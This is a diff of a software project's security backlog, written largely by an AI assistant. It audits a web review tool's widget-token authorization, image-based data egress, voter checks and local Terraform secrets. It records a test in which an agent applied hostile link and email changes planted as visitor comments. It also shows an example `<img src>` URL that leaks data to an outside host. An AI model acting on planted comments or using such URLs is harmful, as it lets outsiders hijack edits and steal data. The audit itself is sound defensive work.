@@ -169,6 +169,53 @@ be mistaken for one.
 
 Found by an audit on 2026-08-20.
 
+## The site-review widget token can read, edit and delete any pending comment in its project
+
+**Author:** Claude · **Type:** security · **Priority:** high · **Status:** pending
+
+`SiteReviewComment` has no author column. Every comment arrives through
+`AddCommentController`, which resolves a *project* from the widget token and
+stores nothing about who submitted it. Two consequences follow; only the second
+was tracked before 2026-08-25.
+
+**Authorization.** With no author, nothing can scope a mutation to the person who
+wrote the comment. Holding only the widget token — a `data-token` attribute in
+page HTML, public by design, as `ApiToken` itself notes ("anyone who can view the
+page holds the credential") — and no session, a visitor can `GET
+/api/site-review/review` for every pending comment in the project (bodies, URLs,
+selectors, quoted page text, not merely the current page's), and `PATCH` or
+`DELETE /api/site-review/comments/{id}` against any of them: `UpdateCommentHandler`
+and `DeleteCommentHandler` both resolve via `findOnePending($commentId, $project)`,
+project scope only. `SiteReviewCorsSubscriber` reflects the request `Origin`, so
+it works from any page, not just an instrumented one.
+
+Bounded three ways: Pending comments only (`Addressed` and `Resolved` are immune),
+one project (widget tokens are rejected by `/api/site-review/sites` and
+`/api/site-review/stream`, so no project enumeration and no Mercure JWT), and
+throttled by `RateLimitSiteReviewWrites` — which slows churn but not a targeted
+delete. Not exposed on loupe.ac: `.env` ships `SITE_REVIEW_WIDGET_TOKEN` empty and
+`templates/layout_base.html.twig` gates it behind `site_review_widget_public or
+is_granted('ROLE_ADMIN')`. It bites any deployment that serves the widget to
+untrusted visitors — which is the case the widget exists for.
+
+**Attribution.** `site_review_get` (`src/Module/SiteReview/Mcp/SiteReviewGetTool.php`)
+carries `id`, `url`, `selector`, `text`, `body`, `status` and `createdAt`, and
+cannot say who wrote any of them, so a visitor's comment and the owner's are
+indistinguishable to an agent. `loupe-site-review` therefore escalates
+categorically: any comment that would change a destination, an identity, a
+credential or third-party code goes to the human. Verified 2026-08-15 by testing
+an agent against comments of exactly that shape — it applied a link-destination
+change and a support-email change on its own judgement when the skill was absent.
+
+Owner decision 2026-08-19 accepted the escalation tax, reasoning that one
+project-scoped token is the only credential and a Loupe session cookie is never
+sent with widget requests from a page the app does not serve, so nothing
+distinguishes an owner from a visitor. **That decision covered injection, not
+tampering** — it predates the read/edit/delete reach above being traced, so it is
+not an acceptance of this entry as now written. Per-reviewer tokens close both
+halves; see 'Personal reviewer tokens as an identity layer for the widget'.
+
+
 ## `digitalocean_app` shows a perpetual diff, so every apply redeploys
 
 **Author:** Claude · **Type:** tooling · **Priority:** low · **Status:** pending
@@ -1440,27 +1487,37 @@ need an explicit `dropElement()`, and note that `dropElement('style')` and
 
 **Author:** Claude · **Type:** security · **Priority:** medium · **Status:** pending
 
-`MarkdownRenderer` allows `<img src>` with no origin restriction, so a document
-can point an image at any host and the reviewer's browser fetches it on page
-open, handing that host the reviewer's IP, User-Agent and a timestamp. Documents
-are agent-authored, which makes the content a plausible injection surface rather
-than something only the reviewer writes.
+`MarkdownRenderer` allows `<img src>` pointing at any host: it permits `img`
+with `src`, `alt`, `title`, `width` and `height`, and never sets
+`allowedMediaHosts`. So a rendered document fetches from that host on open.
 
-This is not new — the pre-existing sanitizer config allowed `img` with the full
-W3C-safe attribute set — but it sits badly beside this project's stated no-egress
-posture (`assets/icons/` is committed and `iconify.on_demand` is off in prod
-precisely so a self-hosted instance never calls out).
+Verified 2026-08-25 against the real renderer, because the scope was previously
+overstated: the sanitizer's default action is Drop, `javascript:` and `data:`
+SVG srcs are stripped, and `<script>`, `<iframe>`, `<svg onload>`, `<object>`,
+`<style>` and inline handlers all produce nothing. **There is no XSS here.**
+`<img>` is the only surviving auto-fetch.
 
-`config/packages/nelmio_security.yaml` does not currently constrain it either:
-the CSP is registered prod-only and sent under `report`, and its `img-src`
-allows `https:` wholesale. Options are to proxy or inline document images at
-render time, restrict `img-src` when the CSP goes enforcing (see "CSP is
-report-only until inline scripts carry nonces"), or accept it explicitly. Worth a
-decision rather than drift.
+Reachability is narrow too. `DocumentVoter` resolves VIEW, CONTRIBUTE and MANAGE
+alike to `$subject->owner === $user`, a project has one owner and no member
+collection, and no share or guest route exists — so the author and the reader
+are the same person. What makes it worth fixing is the shape rather than the
+audience: documents are agent-authored, so content an agent ingested can plant
+`<img src="https://host/?d=...">` and turn the reviewer's browser into an egress
+channel for an agent that may itself be sandboxed without network access. The
+callback carries IP, User-Agent, a timestamp, an origin-only `Referer`, and up to
+a URL's worth of attacker-chosen data. It is stored, so it re-fires on every open.
+That sits badly beside this project's stated no-egress posture (`assets/icons/`
+is committed and `iconify.on_demand` is off in prod precisely so a self-hosted
+instance never calls out).
 
-Ranked below "CSP is report-only until inline scripts carry nonces" deliberately: the
-`img-src` half of the answer is decided there, and this entry only survives on its own if
-the answer turns out to be a render-time proxy or inlining, which nobody has scoped.
+`config/packages/nelmio_security.yaml` does not stop it. The CSP is **enforcing**
+(`enforce:`, since commit 1506c09) but prod-only, and its `img-src` allows
+`https:` wholesale. Narrowing that to `["'self'", 'data:']` closes the
+browser-side half in prod in one line, and leaves dev and any self-hosted
+instance that does not send the CSP — so a render-time proxy or inlining is the
+only complete fix. Whoever scopes that should know `allowRelativeMedias()` is
+currently not called, so relative image paths are stripped today and a proxy has
+to add it.
 
 ## Per-worktree Mailpit sidecar so e2e can run in parallel
 
@@ -1856,26 +1913,31 @@ authenticated user — `SiteReviewCommentVoter`'s entire rule is
 `$subject->project->owner === $token->getUser()` — so **every one of them
 returns true for a tool call by construction**.
 
-Nothing is exploitable today: no tool calls a write path that is meant to be
-human-only, and `ApiTokenAuthenticator` is registered only on the `mcp` and
-`api` firewalls, so a Bearer token cannot reach the `main` firewall's routes at
-all. The docblock on `SiteReviewMarkCommentAddressedTool` used to credit the
-voter for this and now names the real guards instead.
+Nothing is exploitable, re-confirmed 2026-08-25 by tracing every tool: no MCP
+tool consults an ownership voter at all, and `ApiTokenAuthenticator` is
+registered only on the `mcp` and `api` firewalls, so a Bearer token cannot reach
+the `main` firewall's routes.
 
-What is still open is whether that should be made structural rather than
-incidental. A future tool that calls a voter and reads the result as a
-meaningful check would be wrong, and nothing at the voter would tell its author
-so. Options worth weighing: give ownership voters an explicit
-"deny when the token is a machine credential" clause; introduce a distinct
-role or attribute namespace for tool context so a tool cannot accidentally ask
-an ownership question; or leave it and rely on the firewall boundary, with the
-convention written into `project-authz` instead of the code. The first two cost
-indirection at every voter; the third keeps a real invariant only in prose.
+**The Review half is already structural.** `McpBoundProjectVoter` compares the
+token's bound project to the subject's project, which is *narrower* than
+ownership — a token minted for project A cannot read project B even though one
+user owns both — and its docblock says exactly that, with
+`McpBoundProjectVoterTest` behind it. Every Review tool goes through
+`ReviewSubjectResolver`, which only ever asks that voter.
+
+**SiteReview is what is still open.** Its two tools consult no voter, relying
+instead on project-scoped repository lookups (`findOneForProject`,
+`findPendingForProject`). That is correct today but incidental rather than
+stated, and a future SiteReview tool that asks `SiteReviewCommentVoter` and reads
+the answer as a meaningful check would be wrong with nothing at the voter to warn
+its author. Closing it means either giving SiteReview an equivalent of
+`McpBoundProjectVoter`, or writing the boundary into `project-authz` and
+accepting that a real invariant lives only in prose.
 
 ## The actor model is unsettled — no audit trail, and an agent's writes look like the owner's
 
 
-**Author:** Claude · **Type:** security · **Priority:** medium · **Status:** pending
+**Author:** Claude · **Type:** feature · **Priority:** medium · **Status:** pending
 
 There is no audit entity, no audit table and no dedicated Monolog channel —
 `config/packages/monolog.yaml` declares only `deprecation`. What exists is scattered
@@ -3138,12 +3200,21 @@ source document and only `DOCUMENT_READ` on the target
 (`ReviewSubjectResolver::requireReferences()`), yet the target's rendered page
 visibly changes: its "Referenced by" list grows.
 
-Harmless while a project's documents share one owner, since read and write
-land on the same people. It becomes a graffiti vector the day a project has
-several users with differentiated grants — someone who may only read a
-document can still add a line to it. Requiring WRITE on the target is the
-wrong fix: it would break pointing at something you are allowed to read,
-which is the normal case. Revisit when per-document grants exist.
+Not reachable, and the premise is weaker than it reads — checked 2026-08-25.
+`McpBoundProjectVoter` ignores the attribute entirely and returns
+`$boundProject === $subjectProject` for all four of its constants, so READ and
+WRITE are the same check and no read-only principal exists: anyone who can pass
+`requireReferences` already has write on the target and could revise it outright.
+Cross-project is blocked twice over, at the resolver and again by
+`DocumentReferenceValidator`. And a project has one owner with no member
+collection, so "several users with differentiated grants" has no referent yet.
+
+It becomes a graffiti vector the day per-document grants exist. Requiring WRITE
+on the target is the wrong fix: it would break pointing at something you are
+allowed to read, which is the normal case. Bounded even then — the incoming list
+renders as escaped title links plus an archived badge
+(`templates/Module/Review/show_document.html.twig`), so it is a backlink listing
+rather than content injection. Revisit with per-document grants.
 
 ## Bump `.skeleton.json` once the Turbo-prefetch PR merges
 
@@ -3456,38 +3527,6 @@ something else. Whatever it becomes, it belongs in
 and the forwardable decision from the deleted `SubmitReviewHandler` is worth
 re-reading in git history before rebuilding it.
 
-## `site_review_get` does not say who wrote a comment
-
-**Author:** Claude · **Type:** security · **Priority:** medium · **Status:** pending
-
-The payload from `site_review_get`
-(`src/Module/SiteReview/Mcp/SiteReviewGetTool.php`) carries `id`, `url`,
-`selector`, `text`, `body` and `createdAt` — but nothing identifying the author,
-and `SiteReviewComment` has no author column to expose. Every comment arrives
-through `AddCommentController`, which resolves a *project* from the widget token
-and stores nothing about who submitted it.
-
-Scoped 2026-08-19: this is not live on loupe.ac. The widget renders only where
-`SITE_REVIEW_WIDGET_TOKEN` is set, which is development, so in practice the
-author is the developer. It matters for an operator who serves the widget on a
-public page, where a visitor's comment and the owner's are indistinguishable.
-
-The consequence is that `loupe-site-review` has to escalate categorically: any
-comment that would change a destination, an identity, a credential or
-third-party code goes to the human, because the alternative is applying a
-hostile edit dressed as ordinary feedback. Verified 2026-08-15 by testing an
-agent against comments of exactly that shape — it applied a link-destination
-change and a support-email change on its own judgement when the skill was
-absent.
-
-Owner decision 2026-08-19: keep the blanket rule. There is no cheap middle
-option — one project-scoped token is the only credential, and a Loupe session
-cookie is never sent with widget requests from a page the app does not serve, so
-nothing distinguishes an owner from a visitor without per-reviewer tokens. Those
-are worth building for their own reasons; see "Personal reviewer tokens as an
-identity layer for the widget". Until then the escalation stays, and the tax on
-the owner's own feedback is accepted rather than worked around.
-
 ## The admin user detail page shows no project or billing context
 
 **Author:** Claude · **Type:** feature · **Priority:** medium · **Status:** pending
@@ -3648,14 +3687,20 @@ pre-1.0 and moving.
 **Author:** Geoffrey · **Type:** security · **Priority:** low · **Status:** pending
 
 `terraform/versions.tf` has its `backend "s3"` block commented out, so state is
-local. `terraform/terraform.tfstate`, `.tfstate.backup`, `.tfstate.bak` and
-`terraform.tfvars` hold live production credentials in cleartext on whichever
-machine last ran `apply` — the managed-database password, the application
-secret, the DigitalOcean API token and the registry PAT among them.
+local. `terraform/terraform.tfstate` and `.tfstate.backup` hold live production
+credentials in cleartext on whichever machine last ran `apply` — the
+managed-database password and URI, the Spaces access and secret keys,
+`APP_SECRET`, `APP_ENCRYPTION_KEY`, `STRIPE_SECRET_KEY`,
+`STRIPE_WEBHOOK_SECRET`, the OAuth client secrets, `INSTALL_TOKEN` and
+`HEALTH_PROBE_TOKEN` among them. They are marked `"type":"SECRET"` in the app
+spec but stored plaintext in state. The DigitalOcean API token and the registry
+PAT are **not** in state — provider credentials are not persisted there — they
+sit beside it in `terraform/terraform.tfvars`. Same machine, same blast radius,
+different file.
 
-**This is not a repository exposure and should not be triaged as one.** All four
-are covered by `terraform/.gitignore` (`*.tfstate.*` catches the `.bak`) and
-none has ever been committed — verified against full history on 2026-08-20. The
+**This is not a repository exposure and should not be triaged as one.** All of
+them are covered by `terraform/.gitignore` and none has ever been committed —
+verified against full history on 2026-08-20 and again on 2026-08-25. The
 exposure is everything that copies a home directory: system backups, cloud
 sync, a support bundle, a stolen laptop.
 
@@ -3672,10 +3717,6 @@ public and the blast radius of a mistake changes. At that point the work is the
 encrypted backend the file already documents, `terraform init -migrate-state`,
 and deleting the local copies.
 
-One thing worth doing even under this decision: `terraform.tfstate.bak` is not
-managed or rotated by Terraform, so it holds whatever the secrets were on the
-day it was written, indefinitely. Deleting it costs nothing and removes the
-oldest copy.
 
 ## Watch an agent work, rather than reading what it finished
 
